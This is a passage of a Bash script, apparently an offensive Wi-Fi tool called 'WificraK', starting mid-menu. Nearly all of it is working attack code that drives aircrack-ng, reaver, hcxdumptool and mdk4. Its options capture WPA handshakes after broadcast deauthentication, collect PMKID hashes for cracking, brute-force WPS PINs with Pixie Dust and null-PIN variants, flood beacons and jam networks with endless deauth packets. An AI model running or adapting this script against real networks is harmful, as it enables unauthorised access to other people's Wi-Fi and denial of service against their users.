        echo -ne "${blueColour}[1] ${endColour}${grayColour}Handshake (WPA/WPA2 - PSK)${endColour}          ${blueColour}[12]${endColour}${grayColour} ChopChop Attack${endColour}\n"
        echo -ne "${blueColour}[2] ${endColour}${grayColour}Passive Handshake Capture${endColour}           ${blueColour}[13]${endColour}${grayColour} Mac Changer${endColour}\n"
        echo -ne "${blueColour}[3]${endColour} ${grayColour}PMKID attack${endColour}                        ${blueColour}[14]${endColour}${grayColour} Quit${endColour}\n"

        echo -ne "${blueColour}[4] ${endColour}${grayColour}Offline Cracking${endColour}\n"

        echo -ne "${blueColour}[5]${endColour} ${grayColour}Constant Deauth Attack (Jamming)${endColour}\n"
		
        echo -ne "${blueColour}[6]${endColour} ${grayColour}Beacon Flood Attack${endColour}\n"
        
        echo -ne "${blueColour}[7] ${endColour}${grayColour}WPS Brute-force${endColour}\n"

        echo -ne "${blueColour}[8] ${endColour}${grayColour}Null Pin attack${endColour}\n"

        echo -ne "${blueColour}[9]${endColour}${grayColour} Pixie Dust ${endColour}\n"

        echo -ne "${blueColour}[10]${endColour}${grayColour} CaffeLatte${endColour}\n"

        echo -ne "${blueColour}[11]${endColour}${grayColour} Auth DoS${endColour}\n"
        echo -ne "\n"
        echo -ne "${turquoiseColour}[${endColour}${yellowColour}WificraK${endColour}${turquoiseColour}]${endColour}${grayColour} Select an option >> ${endColour}"
        read opc

        case $opc in

			1)clear
				handshake
				sleep 1.5
				;;

            2)clear
            passive_handshake
            sleep 1.5
            ;;



            3)clear
            pmkid_attack
            sleep 1.5
            ;;

			4)clear
				password_cracking_options
				sleep 1.5
				;;

            5)clear
                constant_deauth_attack
                sleep 1.5
                ;;

            6)clear
                Beacon_Flood_attack_menu
                sleep 1.5
                ;;


			7)clear
				wps_bruteforce
				sleep 1.5
				;;


            8)clear
                null_pin_attack
                sleep 1.5
                ;;



            9)clear
                pixie_dust
                sleep 1.5
                ;;



            10)

                CaffeLatte
                sleep 1.5
                ;;


            11)

                authentication_attack
                sleep 1.5
                ;;



            12)clear

                ChopChop_attack

                sleep 1.5
                ;;

            13)clear
                mac_changer_func
                sleep 1.5
                ;;


            14)
                echo -ne "\n\t${greenColour}Bye, bye :)${endColour}\n"
                tput cnorm; airmon-ng stop iw_wificraKmon > /dev/null 2>&1

                ifconfig iw_wificraK down
                ip link set iw_wificraK name $networkCard
                ifconfig $networkCard up

                sleep 1.5;exit 0
                ;;

            *) echo "${redColour}[!]${endColour}${grayColour}$opc Is An Invalid Option${endColour}\n"

                ;;

            esac


    done

}

################################################## WPS Brute-Force ##################################################

function wps_bruteforce(){
    clear

      #wash recon

    xterm -hold -e "wash -i iw_wificraKmon " &


    xterm_wash_recon_PID=$!

    echo -ne "\n${blueColour}[*]${endColour}${grayColour} BSSID of the Access Point: ${endColour}" && read BSSID_WPS

    kill -9 $xterm_wash_recon_PID 2>/dev/null

    clear


    xterm -hold -e "reaver -i iw_wificraKmon -b ${BSSID_WPS} -S -vv -L -N -T .5 -r 3:15" & disown

    sleep 15;echo -ne "\n${blueColour}[+]${endColour}${grayColour} Let the attack run for a while...${endColour}${redColour} it can take several hours${endColour}\n"
    clear


    menu
 
}

################################################## WPS Pixie Dust ##################################################

function pixie_dust(){

    clear

    xterm -hold -e "wash -i iw_wificraKmon" &

    xterm_wash_PID=$!

    echo -ne "\n${blueColour}[*]${endColour}${grayColour} BSSID of the Access Point: ${endColour}" && read BSSID_WPS
 
    kill -9 $xterm_wash_PID 2>/dev/null

    clear


    xterm -hold -e "reaver -i iw_wificraKmon -b ${BSSID_WPS} -K" & disown

    sleep 10;echo -ne "\n${blueColour}[+]${endColour}${grayColour} Let the attack run for a while...${endColour}\n"
    clear


    menu

 
}


################################################## WPS Null Pin Attack ##################################################


function null_pin_attack(){ 

    clear

    xterm -hold -e "wash -i iw_wificraKmon" &

    xterm_wash_PID=$!

    echo -ne "\n${blueColour}[*]${endColour}${grayColour} BSSID of the Access Point: ${endColour}" && read BSSID_WPS

    kill -9 $xterm_wash_PID 2>/dev/null

    clear


    xterm -hold -e "reaver -i iw_wificraKmon -b ${BSSID_WPS} -p '' -N" & disown

    sleep 10;echo -ne "\n${blueColour}[+]${endColour}${grayColour} Let the attack run for a while...${endColour}\n"
    clear


    menu
}

################################################## Passive Handshake func ##################################################

function passive_handshake(){


    all_banners_menu

    mkdir passive_handshake > /dev/null 2>&1

    pushd passive_handshake > /dev/null 2>&1

	xterm -hold -e "airodump-ng iw_wificraKmon" &

    airodump_xterm_PID=$!

    echo -ne "\n${blueColour}[*]${endColour}${grayColour} Access Point Name: ${endColour}" && read APessid
	echo -ne "\n${blueColour}[*]${endColour}${grayColour} Access Point Channel: ${endColour}" && read Channel

    kill -9 $airodump_xterm_PID
    wait $airodump_xterm_PID 2>/dev/null

    xterm -hold -e "airodump-ng -c $Channel -w ${APessid} --essid $APessid iw_wificraKmon" &
    cd ../

    echo -ne "\n${blueColour}[*] ${endColour}${grayColour}When you finish with getting the handshake, you have a directory called 'passive_handshake/' with all the captures${grayColour}" 
    sleep 4

    menu

}

################################################## Monitor mode validator ##################################################

function monitor_mode_verification(){

    ## validating interface
    ip a > ifaces.txt

    checker=0;while [ $checker -ne 1 ];do

        for interface in $(cat ifaces.txt | cut -b 1-20| awk '{print $2}' | grep ':' | tr -d ':');do

            if [ "$networkCard"  == "$interface" ];then

                checker=1

            fi

        done; if [ $checker -eq 0 ];then echo -ne "${redColour}[!] The Interface is not valid, exiting...${endColour}";exit 1; fi

    done
	rm -r ifaces.txt

    ifconfig $networkCard down
    ip link set $networkCard name iw_wificraK
    ifconfig iw_wificraK up
    clear

	if [ $(iwconfig | grep iw_wificraK | grep 'Monitor' > /dev/null 2&>1; echo $?) -ne 0 ];then
		clear
		
		airmon-ng start iw_wificraK > /dev/null 2>&1
		sleep 2.5
		iwconfig iw_wificraK > iface.txt

		if [ $(cat iface.txt | grep Mode | tr ':' ' ' | awk '{print $2}') == 'Monitor' ];then

			echo -ne "${greenColour}[+]${endColour} ${grayColour}The interface has been successfully put on monitor mode${endColor}"
			rm -r iface.txt

		fi
    fi
    tput cnorm
	clear

}



function pmkid_attack(){

    all_banners_menu

    mkdir PMKID > /dev/null 2>&1

    pushd PMKID > /dev/null 2>&1


    echo -ne "\n${blueColour}[*]${endColour}${grayColour} How much time you want to wait in seconds (60 - 1min): ${endColour}" && read time_pmkid
    echo -ne "\n${redColour}[!]${endColour} ${grayColour}Please wait $time_pmkid seconds${endColour}\n"

    echo -ne "\n${blueColour}[*]${endColour}${grayColour} Starting attack...${endColour}\n"


    systemctl stop NetworkManager.service
    systemctl stop wpa_supplicant.service

    xterm -hold -e "hcxdumptool -i iw_wificraKmon -o dumpfile.pcapng --active_beacon --enable_status=15" &
    hcxdumptool_xterm_PID=$!


    sleep $time_pmkid; kill -9 $hcxdumptool_xterm_PID
    wait $hcxdumptool_xterm_PID 2>/dev/null

    systemctl start NetworkManager.service
    systemctl start wpa_supplicant.service
    hcxpcapngtool -o hash.hc22000 -E essidlist dumpfile.pcapng
    clear

    echo -ne "\n${blueColour}[*]${endColour}${grayColour} Your PMKID files are saved in the 'PMKID' directory, the files are ready to be cracked with hashcat${endColour}"
    sleep 5
    cd ../
    menu

}

function handshake(){


	if [ $(iwconfig | grep iw_wificraK | grep 'Monitor' > /dev/null 2&>1; echo $?) -ne 0 ];then
		clear
		## if monitor mode was on
		all_banners_menu

	    xterm -hold -e "airodump-ng iw_wificraKmon" &

    	airodump_xterm_PID=$!

    	echo -ne "\n${blueColour}[*]${endColour}${grayColour} Access Point Name: ${endColour}" && read APessid
	    echo -ne "\n${blueColour}[*]${endColour}${grayColour} Access Point Channel: ${endColour}" && read Channel

    	kill -9 $airodump_xterm_PID
    	wait $airodump_xterm_PID 2>/dev/null
    	xterm -hold -e "airodump-ng -c $Channel -w ${APessid} --essid $APessid iw_wificraKmon" &

    	airodump_filter_xterm_PID=$!

    	sleep 10; xterm -hold -e "aireplay-ng -0 5 -e ${APessid} -c 'FF:FF:FF:FF:FF:FF' iw_wificraKmon" &

    	aireplay_xterm_PID=$!
    	sleep 10; kill -9 $aireplay_xterm_PID; wait $aireplay_xterm_PID 2>/dev/null

 	    sleep 15; kill -9 $airodump_filter_xterm_PID
    	wait $airodump_filter_xterm_PID 2>/dev/null
    	clear

    	## Validating hasdshake with aircrack-ng
    	aircrack_valid=$(aircrack-ng *.cap | awk '{print $5}' | tr '\n' ' ' | tr -d '(' | awk '{print $1}')
    	if [ $aircrack_valid -eq "1" ]; then
			clear
			all_banners_menu
        	echo -ne "\n${greenColour}[*] Handshake of $APessid has been Successfully captured !!!${endColour}\n"
        	mkdir Captures 2>/dev/null

        	echo -ne "\n${blueColour}[+]${endColour}${grayColour} Capture directory has been created${endColour}\n"
        	mv $APessid*.cap Captures/$APessid-handshake.cap 2>/dev/null
        	rm -r ${APessid}*.*
        	filepath=$(find $(pwd) -name $APessid-handshake.cap 2>/dev/null)

        	echo -ne "\n${blueColour}[*]${endColour} ${grayColour}File Path: $filepath${endColour}\n"
        	sleep 7

        	# WPA cracking aircrack + crunch
        	cracking_pass

    	else

        	clear
        	echo -ne "\n${redColour}[!] Handshake has not been captured....${endColour}\n"
        	sleep 3
        	clear;menu

    	fi

	fi
	tput cnorm
}


function Beacon_Flood_attack_menu(){

    opt_b=0

    while [[ $opt_b -ne 3 ]];do
        clear
		all_banners_menu

        echo -ne "\n${blueColour}[1]${endColour}${grayColour} Use a ssid text list${endColour}\n"
        echo -ne "${blueColour}[2]${endColour} ${grayColour}Just do the Beacon Flood attack with random characters${endColour}\n"
        echo -ne "${blueColour}[3]${endColour}${grayColour} back${endColour}\n"
		echo -ne "\n${yellowColour}[>]${endColour}${grayColour} Choose an option > ${endColour}" && read opc

        case $opc in

            1)
                echo -ne "${blueColour}[${endColour}${grayColour}*${endColour}${blueColour}]${endColour} ${grayColour}Pass the the name of the custom ssid file: ${endColour}" && read ssid_list;
      
                xterm -hold -e "mdk4 iw_wificraKmon b -a -g -f $ssid_list" &
                break
                menu
                ;;
      
            2)

                xterm -hold -e "mdk4 iw_wificraKmon b -a -w nta -m" &
                break
                menu
                ;;

            3)

                menu
                ;;

            *) 
                echo -ne "${redColour}[!]${endColour} $opc Invalid Option\n"
                ;;
        esac
    done
}

function constant_deauth_attack(){

    xterm -hold -e "airodump-ng iw_wificraKmon" &
    airodump_xterm_PID=$!

    echo -ne "\n${blueColour}[*]${endColour}${grayColour} Access Point Name: ${endColour}" && read APessid
	echo -ne "\n${blueColour}[*]${endColour}${grayColour} Access Point Channel: ${endColour}" && read Channel

    kill -9 $airodump_xterm_PID
    wait $airodump_xterm_PID 2>/dev/null
    
    xterm -hold -e "airodump-ng -c $Channel -w ${APessid} --essid $APessid iw_wificraKmon" &

    airodump_filter_xterm_PID=$!

    sleep 10; xterm -hold -e "aireplay-ng -0 0 -e ${APessid} -c 'FF:FF:FF:FF:FF:FF' iw_wificraKmon" &

    clear




}

function qhelppanel(){

	echo -ne "${redColour} █     █░ ██▓  █████▒██▓ ▄████▄   ██▀███   ▄▄▄       ██ ▄█▀${endColour}\n"
	echo -ne "${redColour}▓█░ █ ░█░▓██▒▓██   ▒▓██▒▒██▀ ▀█  ▓██ ▒ ██▒▒████▄     ██▄█▒ ${endColour}\n"
	echo -ne "${redColour}▒█░ █ ░█ ▒██▒▒████ ░▒██▒▒▓█    ▄ ▓██ ░▄█ ▒▒██  ▀█▄  ▓███▄░ ${endColour}\n"
	echo -ne "${redColour}░█░ █ ░█ ░██░░▓█▒  ░░██░▒▓▓▄ ▄██▒▒██▀▀█▄  ░██▄▄▄▄██ ▓██ █▄ ${endColour}\n"
	sleep 0.5
	echo -ne "${redColour}░░██▒██▓ ░██░░▒█░   ░██░▒ ▓███▀ ░░██▓ ▒██▒ ▓█   ▓██▒▒██▒ █▄${endColour}\n"
	echo -ne "${redColour}░ ▓░▒ ▒  ░▓   ▒ ░   ░▓  ░ ░▒ ▒  ░░ ▒▓ ░▒▓░ ▒▒   ▓▒█░▒ ▒▒ ▓▒${endColour}\n"
	echo -ne "${redColour}  ▒ ░ ░   ▒ ░ ░      ▒ ░  ░  ▒     ░▒ ░ ▒░  ▒   ▒▒ ░░ ░▒ ▒░${endColour}\n"
	sleep 0.5

	echo -ne "${redColour}  ░   ░   ▒ ░ ░ ░    ▒ ░░          ░░   ░   ░   ▒   ░ ░░ ░ ${endColour}\n"
	echo -ne "${redColour}    ░     ░          ░  ░ ░         ░           ░  ░░  ░   ${endColour}\n"
	echo -ne "${redColour}                        ░                                 ${endColour}\n"


	echo -ne "${yellowColour}[${endColour}${blueColour}WificraK${endColour}${yellowColour}]${endColour} ${blueColour}WI-FI Explotation Tool${endColour}\n"


    echo -ne "\t\n${yellowColour}[>]${endColour}${grayColour} Usage: ./wificraK -n <interface> ${endColour}"
}


function dependencies(){

    ## checking dependencies
    dependencies=(aircrack-ng macchanger xterm hcxdumptool crunch wash reaver)

    echo -ne "${purpleColour}[*] ${endColour}${blueColour}Checking dependencies${endColour}\n"

    sleep 2

    for program in "${dependencies[@]}"; do
        echo -ne "${grayColour}\n[*] $program ${endColour}"
        test -f /usr/bin/$program

        if [ "$(echo $?)" == "0" ];then

            echo -e " ${greenColour}(Installed)${endColour}"
        else

            echo -e "\n[*] Installing $program\n"
            apt-get install $program -y > /dev/null 2>&1


        fi;sleep 1

    done
    clear
}


## User id verification for (root)

if [ $(id -u) -eq "0" ];then

    declare -i parameter_counter=0; while getopts ":n:h:" arg; do
        case $arg in
            n) networkCard=$OPTARG; let parameter_counter+=1 ;;
            h) helpPanel;;
        esac
    done

    if [ $parameter_counter -ne 1 ];then

		
        qhelppanel

    else
		monitor_mode_verification
        dependencies
        menu


    fi

else
    echo -ne "\n${redColour}[!]${endColour} ${grayColour}You need to be root to execute this program${endColour}\n"

    exit 1
fi
